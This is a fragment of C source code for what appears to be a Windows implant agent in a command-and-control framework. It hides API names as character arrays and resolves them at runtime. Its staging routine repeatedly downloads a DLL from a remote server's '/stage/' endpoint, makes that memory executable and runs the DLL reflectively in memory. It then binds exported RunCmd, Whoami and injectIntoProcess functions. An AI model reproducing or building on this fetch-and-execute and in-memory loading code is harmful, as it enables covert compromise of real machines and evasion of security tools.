    user32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(user32_c);
    msvcrtdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(msvcrt_c);
    winhttpdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(winhttp_c);
    crypt32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(crypt32_c);
    shlwapidll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(shlwapi_c);

    // WinHTTP
    api->WinHttpConnect = GetSymbolAddress((HANDLE)winhttpdll, winHttpConnect_c);
    api->WinHttpOpen = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpen_c);
    api->WinHttpOpenRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpenRequest_c);
    api->WinHttpSendRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpSendRequest_c);
    api->WinHttpReceiveResponse = GetSymbolAddress((HANDLE)winhttpdll, winHttpReceiveResponse_c);
    api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
    api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
    api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);
    api->WinHttpCloseHandle = GetSymbolAddress((HANDLE)winhttpdll, winHttpCloseHandle_c);

    // Getting functions
    // User32
    // Msvcrt
    // kernel32
    api->malloc = GetSymbolAddress((HANDLE)msvcrtdll, malloc_c);
    api->calloc = GetSymbolAddress((HANDLE)msvcrtdll, calloc_c);
    api->free = GetSymbolAddress((HANDLE)msvcrtdll, free_c);
    api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
    api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
    api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
    #ifdef DEBUG
    api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    #endif
    api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
    api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
    api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
    api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
    api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
    api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);
    api->ExitThread = GetSymbolAddress((HANDLE)kernel32dll, exitThread_c);

    // crypt32
    api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
    api->CryptBinaryToStringA = GetSymbolAddress((HANDLE)crypt32dll, CryptBinaryToStringA_c);

    // shlwapi
    api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);

    return _api;
}

ESG_STD_API _populate_esgStd_api(DLL* pEsgStdDll)
{
    ESG_STD_API esgStdApi = {0};

    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
    CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };

    esgStdApi.RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
    esgStdApi.Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
    esgStdApi.injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);

    return esgStdApi;
}

VOID AGENT_downloadPrimalDll(Agent* agent, PDLL pPrimalDll)
{
    #ifdef DEBUG
    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
    #endif

    pPrimalDll->pBuffer = NULL;
    pPrimalDll->Size = 0;

    // TODO: Move this somewhere else, store a Server struct inside Agent?
    WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };

    while (pPrimalDll->pBuffer == NULL)
    {
        pPrimalDll->pBuffer = httpGetExecutable(&agent->api, &pPrimalDll->Size, wcStageEndpoint, agent->_remoteServer, agent->_remotePort);
        ((SLEEP)agent->api.Sleep)(agent->_interval);  // TODO: Implement AgentIntervalGet
        if (pPrimalDll->pBuffer != NULL)
        { break; }
        #ifdef DEBUG
        ((MESSAGEBOXA)agent->api.MessageBoxA)(0, msg, msg, 0X0L);
        #endif
    }
}

// TODO: Pass the name of the reflective loader as a parameter
/*
This function runs the function named "ReflectiveLoader" in a reflective dll
execueRD uses GetRLOffset which looks for the name "ReflectiveLoader"

Input:
    [in] PAPI api: a pointer to the API struct

    [in] PDLL: a pointer to the DLL struct that holds a reflective DLL

Output:
    Success -> HANDLE: handle to the new region the DLL has been written to, this handle needs to be freed

    Failure -> NULL
*/
HANDLE executeRD(PAPI api, PDLL pDll)
{
    DWORD loaderOffset;
    REFLECTIVELOADER pReflectiveLoader;
    DLLMAIN pDllMain;

    // get the offset of the reflective loader
    loaderOffset = GetRLOffset(api, pDll->pBuffer);

    #ifdef DEBUG
    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
    //((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->pBuffer + loaderOffset);
    #endif

    // get the real address of the reflective loader, cast it to a function
    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->pBuffer + loaderOffset);

    // TODO: Revert PAGE_EXECUTE_READWRITE protections
    // TODO: Use PAGE_EXECUTE_READ protections instead
    DWORD dwOldProtect;
    // give the memory region that holds the reflective loader execute-read-write permissions
    ((VIRTUALPROTECT)api->VirtualProtect)(pDll->pBuffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // run the reflective loader
    // reflective loader returns an address to DLLMain, cast it to a function pointer
    pDllMain = (DLLMAIN)pReflectiveLoader();

    #ifdef DEBUG
    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
    #endif

    HANDLE hDllBase = NULL;

    if( pDllMain != NULL )
    {
        // call the loaded library's DllMain with DLL_QUERY_HMODULE to get its HMODULE (i.e. base address)
        // https://stackoverflow.com/questions/9545732/what-is-hmodule
        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
        {
            #ifdef DEBUG
            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
            #endif
            hDllBase = NULL;
        }
    }
    else
    {
    #ifdef DEBUG
        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
        #endif
    }

    return hDllBase;
}

DLL AGENT_loadReflectiveDll(Agent* agent)
{
    // downloaded DLL with the reflective loader in it
    DLL primalDll = {.pBuffer = NULL, .Size = 0};

    AGENT_downloadPrimalDll(agent, &primalDll);

    #ifdef DEBUG
    CHAR ntHeader_f[] = { '1', 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0};
    // e_lfanew = offset to nt headers
    ((PRINTF)agent->api.printf)(ntHeader_f, (UINT_PTR)(primalDll.pBuffer) + ((PIMAGE_DOS_HEADER)primalDll.pBuffer)->e_lfanew);
    #endif

    DLL esgStdDll;
    esgStdDll.pBuffer = NULL;

    // the DLL is in its prime form after running the reflective loader
    esgStdDll.pBuffer = executeRD(&agent->api, &primalDll);

    // free the previous DLL
    ((FREE)agent->api.free)(primalDll.pBuffer);
    primalDll.pBuffer = NULL;

    return esgStdDll;
}

